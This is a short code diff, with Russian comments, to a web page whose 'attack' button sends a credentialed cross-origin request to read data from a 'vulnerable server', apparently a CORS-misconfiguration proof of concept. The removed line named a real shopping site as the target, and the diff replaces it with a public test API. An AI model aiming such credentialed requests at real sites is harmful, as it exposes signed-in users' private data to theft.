@@ -14,8 +14,9 @@
         document.getElementById('attackBtn').addEventListener('click', function() {
             // Запрос на уязвимый сервер для получения данных
             var xhr = new XMLHttpRequest();
-            xhr.open('GET', 'https://www.temu.com/', true);  // Целевой уязвимый сайт
+            xhr.open('GET', 'https://jsonplaceholder.typicode.com/todos/1', true);  // Тестовый API
             xhr.withCredentials = true;
+
             xhr.onreadystatechange = function() {
                 if (xhr.readyState === 4) {
                     if (xhr.status === 200) {
@@ -31,6 +32,11 @@
                     }
                 }
             };
+
+            xhr.onerror = function() {
+                console.error('Error making the request');
+            };
+
             xhr.send();
         });
     </script>
